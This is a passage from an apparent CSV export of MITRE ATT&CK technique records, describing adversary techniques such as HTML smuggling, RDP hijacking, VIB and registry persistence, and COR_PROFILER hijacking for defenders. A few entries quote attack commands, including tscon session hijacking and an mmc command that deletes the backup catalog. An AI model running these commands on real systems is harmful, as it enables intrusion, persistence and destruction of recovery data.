By leveraging existing access broker networks rather than developing or obtaining their own initial access capabilities, an adversary can potentially reduce the resources required to gain a foothold on a target network and focus their efforts on later stages of compromise. Adversaries may prioritize acquiring access to systems that have been determined to lack security monitoring or that have high privileges, or systems that belong to organizations in a particular sector.(Citation: Microsoft Ransomware as a Service)(Citation: CrowdStrike Access Brokers)

In some cases, purchasing access to an organization in sectors such as IT contracting, software development, or telecommunications may allow an adversary to compromise additional victims via a [Trusted Relationship](https://attack.mitre.org/techniques/T1199), [Multi-Factor Authentication Interception](https://attack.mitre.org/techniques/T1111), or even [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195).

**Note:** while this technique is distinct from other behaviors such as [Purchase Technical Data](https://attack.mitre.org/techniques/T1597/002) and [Credentials](https://attack.mitre.org/techniques/T1589/001), they may often be used in conjunction (especially where the acquired foothold requires [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",PRE,FALSE,FALSE,2023-03-10T15:37:21Z
attack-pattern--d28ef391-8ed4-45dc-bc4a-2f43abf54416,1,T1213,Data from Information Repositories,"Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, such as Credential Access, Lateral Movement, or Defense Evasion, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization (i.e., [Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537)). 

The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:

* Policies, procedures, and standards
* Physical / logical network diagrams
* System architecture diagrams
* Technical system documentation
* Testing / development credentials (i.e., [Unsecured Credentials](https://attack.mitre.org/techniques/T1552)) 
* Work / project schedules
* Source code snippets
* Links to network shares and other internal resources
* Contact or other sensitive information about business partners and customers, including personally identifiable information (PII) 

Information stored in a repository may vary based on the specific instance or environment. Specific common information repositories include the following:

* Storage services such as IaaS databases, enterprise databases, and more specialized platforms such as customer relationship management (CRM) databases 
* Collaboration platforms such as SharePoint, Confluence, and code repositories
* Messaging platforms such as Slack and Microsoft Teams 

In some cases, information repositories have been improperly secured, typically by unintentionally allowing for overly-broad access by all users or even public access to unauthenticated users. This is particularly common with cloud-native or cloud-hosted services, such as AWS Relational Database Service (RDS), Redis, or ElasticSearch.(Citation: Mitiga)(Citation: TrendMicro Exposed Redis 2020)(Citation: Cybernews Reuters Leak 2022)","Linux, Windows, macOS, SaaS, IaaS, Office Suite",FALSE,FALSE,2018-04-18T17:59:24Z
attack-pattern--d2d642da-61ff-4211-b4df-7923c9ca220c,1,T1059.012,Hypervisor CLI,"Adversaries may abuse hypervisor command line interpreters (CLIs) to execute malicious commands. Hypervisor CLIs typically enable a wide variety of functionality for managing both the hypervisor itself and the guest virtual machines it hosts. 

For example, on ESXi systems, tools such as `esxcli` and `vim-cmd` allow administrators to configure firewall rules and log forwarding on the hypervisor, list virtual machines, start and stop virtual machines, and more.(Citation: Broadcom ESXCLI Reference)(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: LOLESXi) Adversaries may be able to leverage these tools in order to support further actions, such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).",ESXi,FALSE,FALSE,2025-03-26T20:01:13Z
attack-pattern--d40239b3-05ff-46d8-9bdd-b46d13463ef9,1,T1200,Hardware Additions,"Adversaries may physically introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e. [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091)), more robust hardware additions can be used to introduce new functionalities and/or features into a system that can then be abused.

While public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping, network traffic modification (i.e. [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)), keystroke injection, kernel memory reading via DMA, addition of new wireless access points to an existing network, and others.(Citation: Ossmann Star Feb 2011)(Citation: Aleks Weapons Nov 2015)(Citation: Frisk DMA August 2016)(Citation: McMillan Pwn March 2012)","Windows, Linux, macOS",FALSE,FALSE,2018-04-18T17:59:24Z
attack-pattern--d467bc38-284b-4a00-96ac-125f447799fc,1,T1132.002,Non-Standard Encoding,"Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.(Citation: Wikipedia Binary-to-text Encoding)(Citation: Wikipedia Character Encoding)","ESXi, Linux, macOS, Windows",FALSE,FALSE,2020-03-14T23:39:50Z
attack-pattern--d4b96d2c-1032-4b22-9235-2b5b649d0605,1,T1556.001,Domain Controller Authentication,"Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. 

Malware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user’s account and/or credentials (ex: [Skeleton Key](https://attack.mitre.org/software/S0007)). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.(Citation: Dell Skeleton)",Windows,FALSE,FALSE,2020-02-11T19:05:02Z
attack-pattern--d4dc46e3-5ba5-45b9-8204-010867cacfcb,1,T1027.006,HTML Smuggling,"Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.(Citation: HTML Smuggling Menlo Security 2020)(Citation: Outlflank HTML Smuggling 2018)

Adversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as <code>text/plain</code> and/or <code>text/html</code>. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)), potentially bypassing content filters.

For example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as <code>msSaveBlob</code>.(Citation: HTML Smuggling Menlo Security 2020)(Citation: MSTIC NOBELIUM May 2021)(Citation: Outlflank HTML Smuggling 2018)(Citation: nccgroup Smuggling HTA 2017)","Linux, macOS, Windows",FALSE,FALSE,2021-05-20T12:20:42Z
attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab,1,T1498,Network Denial of Service,"Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)

A Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).

To perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.

Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.

For DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).","Windows, IaaS, Linux, macOS, Containers",FALSE,FALSE,2019-04-17T20:23:15Z
attack-pattern--e0033c16-a07e-48aa-8204-7c3ca669998c,1,T1563.002,RDP Hijacking,"Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)

Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\windows\system32\tscon.exe [session number to be stolen]`, an adversary can hijack a session without the need for credentials or prompts to the user.(Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions.(Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.(Citation: Kali Redsnarf)",Windows,FALSE,FALSE,2020-02-25T18:35:42Z
attack-pattern--e0232cb0-ded5-4c2e-9dc7-2893142a5c11,1,T1547.013,XDG Autostart Entries,"Adversaries may add or modify XDG Autostart Entries to execute malicious programs or commands when a user’s desktop environment is loaded at login. XDG Autostart entries are available for any XDG-compliant Linux system. XDG Autostart entries use Desktop Entry files (`.desktop`) to configure the user’s desktop environment upon user login. These configuration files determine what applications launch upon user login, define associated applications to open specific file types, and define applications used to open removable media.(Citation: Free Desktop Application Autostart Feb 2006)(Citation: Free Desktop Entry Keys)

Adversaries may abuse this feature to establish persistence by adding a path to a malicious binary or command to the `Exec` directive in the `.desktop` configuration file. When the user’s desktop environment is loaded at user login, the `.desktop` files located in the XDG Autostart directories are automatically executed. System-wide Autostart entries are located in the `/etc/xdg/autostart` directory while the user entries are located in the `~/.config/autostart` directory.

Adversaries may combine this technique with [Masquerading](https://attack.mitre.org/techniques/T1036) to blend malicious Autostart entries with legitimate programs.(Citation: Red Canary Netwire Linux 2022)",Linux,FALSE,FALSE,2019-09-10T18:13:12Z
attack-pattern--e24fcba8-2557-4442-a139-1ee2f2e784db,1,T1526,Cloud Service Discovery,"An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Entra ID, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.

Adversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Microsoft Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.(Citation: Azure - Resource Manager API)(Citation: Azure AD Graph API)

For example, Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.(Citation: Azure - Stormspotter)(Citation: GitHub Pacu)

Adversaries may use the information gained to shape follow-on behaviors, such as targeting data or credentials from enumerated services or evading identified defenses through [Disable or Modify Tools](https://attack.mitre.org/techniques/T1685) or [Disable or Modify Cloud Log](https://attack.mitre.org/techniques/T1685/002).","IaaS, Identity Provider, Office Suite, SaaS",FALSE,FALSE,2019-08-30T13:01:10Z
attack-pattern--e3b168bd-fcd7-439e-9382-2e6c2f63514d,1,T1590.001,Domain Properties,"Adversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers.

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex: [WHOIS](https://attack.mitre.org/techniques/T1596/002)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Where third-party cloud providers are in use, this information may also be exposed through publicly available API endpoints, such as GetUserRealm and autodiscover in Office 365 environments.(Citation: Azure Active Directory Reconnaisance)(Citation: Office 265 Azure Domain Availability) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).",PRE,FALSE,FALSE,2020-10-02T15:46:24Z
attack-pattern--e49920b0-6c54-40c1-9571-73723653205f,1,T1538,Cloud Service Dashboard,"An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, review findings of potential security risks, and run additional queries, such as finding public IP addresses and open ports.(Citation: Google Command Center Dashboard)

Depending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This also allows the adversary to gain information without manually making any API requests.","IaaS, SaaS, Office Suite, Identity Provider",FALSE,FALSE,2019-08-30T18:11:24Z
attack-pattern--e4dc8c01-417f-458d-9ee0-bb0617c1b391,1,T1622,Debugger Evasion,"Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.(Citation: ProcessHacker Github)

Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497), if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.

Specific checks will vary based on the target and/or adversary. On Windows, this may involve [Native API](https://attack.mitre.org/techniques/T1106) function calls such as <code>IsDebuggerPresent()</code> and <code> NtQueryInformationProcess()</code>, or manually checking the <code>BeingDebugged</code> flag of the Process Environment Block (PEB). On Linux, this may involve querying `/proc/self/status` for the `TracerPID` field, which indicates whether or not the process is being traced by dynamic analysis tools.(Citation: Cado Security P2PInfect 2023)(Citation: Positive Technologies Hellhounds 2023) Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would “swallow” or handle the potential error).(Citation: hasherezade debug)(Citation: AlKhaser Debug)(Citation: vxunderground debug)

Malware may also leverage Structured Exception Handling (SEH) to detect debuggers by throwing an exception and detecting whether the process is suspended. SEH handles both hardware and software expectations, providing control over the exceptions including support for debugging. If a debugger is present, the program’s control will be transferred to the debugger, and the execution of the code will be suspended. If the debugger is not present, control will be transferred to the SEH handler, which will automatically handle the exception and allow the program’s execution to continue.(Citation: Apriorit)

Adversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping [Native API](https://attack.mitre.org/techniques/T1106) function calls such as <code>OutputDebugStringW()</code>.(Citation: wardle evilquest partii)(Citation: Checkpoint Dridex Jan 2021)","Linux, macOS, Windows",FALSE,FALSE,2022-04-01T17:59:46Z
attack-pattern--e51137a5-1cdc-499e-911a-abaedaa5ac86,1,T1036.006,Space after Filename,"Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.

For example, if there is a Mach-O executable file called <code>evil.bin</code>, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to <code>evil.txt</code>, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to <code>evil.txt </code> (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed (Citation: Mac Backdoors are back).

Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.","Linux, macOS",FALSE,FALSE,2020-02-10T20:47:10Z
attack-pattern--e5d550f3-2202-4634-85f2-4a200a1d49b3,1,T1608.006,SEO Poisoning,"Adversaries may poison mechanisms that influence search engine optimization (SEO) to further lure staged capabilities towards potential victims. Search engines typically display results to users based on purchased ads as well as the site’s ranking/score/reputation calculated by their web crawlers and algorithms.(Citation: Atlas SEO)(Citation: MalwareBytes SEO)

To help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries may stage content that explicitly manipulates SEO rankings in order to promote sites hosting their malicious payloads (such as [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)) within search engines. Poisoning SEO rankings may involve various tricks, such as stuffing keywords (including in the form of hidden text) into compromised sites. These keywords could be related to the interests/browsing habits of the intended victim(s) as well as more broad, seasonably popular topics (e.g. elections, trending news).(Citation: ZScaler SEO)(Citation: Atlas SEO)

In addition to internet search engines (such as Google), adversaries may also aim to manipulate specific in-site searches for developer platforms (such as GitHub) to deceive users towards [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) lures. In-site searches will rank search results according to their own algorithms and metrics such as popularity(Citation: Chexmarx-seo) which may be targeted and gamed by malicious actors.(Citation: Checkmarx-oss-seo)

Adversaries may also purchase or plant incoming links to staged capabilities in order to boost the site’s calculated relevance and reputation.(Citation: MalwareBytes SEO)(Citation: DFIR Report Gootloader)

SEO poisoning may also be combined with evasive redirects and other cloaking mechanisms (such as measuring mouse movements or serving content based on browser user agents, user language/localization settings, or HTTP headers) in order to feed SEO inputs while avoiding scrutiny from defenders.(Citation: ZScaler SEO)(Citation: Sophos Gootloader)",PRE,FALSE,FALSE,2022-09-30T21:14:12Z
attack-pattern--ed730f20-0e44-48b9-85f8-0e2adeb76867,1,T1591.001,Determine Physical Locations,"Adversaries may gather the victim's physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are housed. Physical locations may also indicate what legal jurisdiction and/or authorities the victim operates within.

Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594) or [Social Media](https://attack.mitre.org/techniques/T1593/001)).(Citation: ThreatPost Broadvoice Leak)(Citation: SEC EDGAR Search) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).",PRE,FALSE,FALSE,2020-10-02T16:32:33Z
attack-pattern--ed7efd4d-ce28-4a19-a8e6-c58011eb2c7a,1,T1137.002,Office Test,"Adversaries may abuse the Microsoft Office ""Office Test"" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.(Citation: Hexacorn Office Test)(Citation: Palo Alto Office Test Sofacy)

There exist user and global Registry keys for the Office Test feature, such as:

* <code>HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Office test\Special\Perf</code>

Adversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.","Windows, Office Suite",FALSE,FALSE,2019-11-07T19:44:04Z
attack-pattern--eec23884-3fa1-4d8a-ac50-6f104d51e235,1,T1001.002,Steganography,"Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control.","Linux, macOS, Windows, ESXi",FALSE,FALSE,2020-03-15T00:37:58Z
attack-pattern--f2857333-11d4-45bf-b064-2c28d8525be5,1,T1564.004,NTFS File Attributes,"Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)

Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)",Windows,FALSE,FALSE,2020-03-13T20:33:00Z
attack-pattern--f4c1826f-a322-41cd-9557-562100848c84,1,T1556,Modify Authentication Process,"Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).

Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.","IaaS, Identity Provider, Linux, macOS, Network Devices, Office Suite, SaaS, Windows",FALSE,FALSE,2020-02-11T19:01:56Z
attack-pattern--f5946b5e-9408-485f-a7f7-b5efc88909b6,1,T1056.004,Credential API Hooking,"Adversaries may hook into Windows application programming interface (API) functions and Linux system functions to collect user credentials. Malicious hooking mechanisms may capture API or function calls that include parameters that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike [Keylogging](https://attack.mitre.org/techniques/T1056/001), this technique focuses specifically on API functions that include parameters that reveal user credentials. 

In Windows, hooking involves redirecting calls to these functions and can be implemented via:

* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.(Citation: Microsoft Hook Overview)(Citation: Elastic Process Injection July 2017)
* **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored.(Citation: Elastic Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015)
* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.(Citation: Elastic Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)

In Linux and macOS, adversaries may hook into system functions via the `LD_PRELOAD` (Linux) or `DYLD_INSERT_LIBRARIES` (macOS) environment variables, which enables loading shared libraries into a program’s address space. For example, an adversary may capture credentials by hooking into the `libc read` function leveraged by SSH or SCP.(Citation: Intezer Symbiote 2022)","Windows, Linux, macOS",FALSE,FALSE,2020-02-11T19:01:15Z
attack-pattern--f7c0689c-4dbd-489b-81be-7cb7c7079ade,1,T1001.001,Junk Data,"Adversaries may add junk data to protocols used for command and control to make detection more difficult.(Citation: FireEye SUNBURST Backdoor December 2020) By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters.","ESXi, Linux, macOS, Windows",FALSE,FALSE,2020-03-15T00:30:25Z
attack-pattern--f8ba7d61-11c5-4130-bafd-7c3ff5fbf4b5,1,T1505.006,vSphere Installation Bundles,"Adversaries may abuse vSphere Installation Bundles (VIBs) to establish persistent access to ESXi hypervisors. VIBs are collections of files used for software distribution and virtual system management in VMware environments. Since ESXi uses an in-memory filesystem where changes made to most files are stored in RAM rather than in persistent storage, these modifications are lost after a reboot. However, VIBs can be used to create startup tasks, apply custom firewall rules, or deploy binaries that persist across reboots. Typically, administrators use VIBs for updates and system maintenance.

VIBs can be broken down into three components:(Citation: VMware VIBs)

* VIB payload: a `.vgz` archive containing the directories and files to be created and executed on boot when the VIBs are loaded.  
* Signature file: verifies the host acceptance level of a VIB, indicating what testing and validation has been done by VMware or its partners before publication of a VIB. By default, ESXi hosts require a minimum acceptance level of PartnerSupported for VIB installation, meaning the VIB is published by a trusted VMware partner. However, privileged users can change the default acceptance level using the `esxcli` command line interface. Additionally, VIBs are able to be installed regardless of acceptance level by using the <code> esxcli software vib install --force</code> command. 
* XML descriptor file: a configuration file containing associated VIB metadata, such as the name of the VIB and its dependencies.  

Adversaries may leverage malicious VIB packages to maintain persistent access to ESXi hypervisors, allowing system changes to be executed upon each bootup of ESXi – such as using  `esxcli` to enable firewall rules for backdoor traffic, creating listeners on hard coded ports, and executing backdoors.(Citation: Google Cloud Threat Intelligence ESXi VIBs 2022) Adversaries may also masquerade their malicious VIB files as PartnerSupported by modifying the XML descriptor file.(Citation: Google Cloud Threat Intelligence ESXi VIBs 2022)",ESXi,FALSE,FALSE,2025-03-27T18:41:08Z
attack-pattern--fde016f6-211a-41c8-a4ab-301f1e419c62,1,T1669,Wi-Fi Networks,"Adversaries may gain initial access to target systems by connecting to wireless networks. They may accomplish this by exploiting open Wi-Fi networks used by target devices or by accessing secured Wi-Fi networks — requiring [Valid Accounts](https://attack.mitre.org/techniques/T1078) — belonging to a target organization.(Citation: DOJ GRU Charges 2018)(Citation: Nearest Neighbor Volexity) Establishing a connection to a Wi-Fi access point requires a certain level of proximity to both discover and maintain a stable network connection. 

Adversaries may establish a wireless connection through various methods, such as by physically positioning themselves near a Wi-Fi network to conduct close access operations. To bypass the need for physical proximity, adversaries may attempt to remotely compromise nearby third-party systems that have both wired and wireless network connections available (i.e., dual-homed systems). These third-party compromised devices can then serve as a bridge to connect to a target’s Wi-Fi network.(Citation: Nearest Neighbor Volexity)

Once an initial wireless connection is achieved, adversaries may leverage this access for follow-on activities in the victim network or further targeting of specific devices on the network. Adversaries may perform [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) activities for [Credential Access](https://attack.mitre.org/tactics/TA0006) or [Discovery](https://attack.mitre.org/tactics/TA0007).","Linux, Network Devices, Windows, macOS",FALSE,FALSE,2025-02-25T15:49:33Z
attack-pattern--ffbcfdb0-de22-4106-9ed3-fc23c8a01407,1,T1218.014,MMC,"Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.(Citation: win_mmc)(Citation: what_is_mmc) MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.(Citation: win_msc_files_overview)

For example, <code>mmc C:\Users\foo\admintools.msc /a</code> will open a custom, saved console msc file in author mode.(Citation: win_mmc) Another common example is <code>mmc gpedit.msc</code>, which will open the Group Policy Editor application window. 

Adversaries may use MMC commands to perform malicious tasks. For example, <code>mmc wbadmin.msc delete catalog -quiet</code> deletes the backup catalog on the system (i.e. [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)) without prompts to the user (Note: <code>wbadmin.msc</code> may only be present by default on Windows Server operating systems).(Citation: win_wbadmin_delete_catalog)(Citation: phobos_virustotal)

Adversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) class object.(Citation: win_clsid_key) Then, adversaries may create custom consoles with the “Link to Web Address” snap-in that is linked to the malicious CLSID subkey.(Citation: mmc_vulns) Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: <code>mmc.exe -Embedding C:\path\to\test.msc</code>.(Citation: abusing_com_reg)",Windows,FALSE,FALSE,2021-09-28T01:36:41Z
attack-pattern--ffeb0780-356e-4261-b036-cfb6bd234335,1,T1574.012,COR_PROFILER,"Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)

The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)

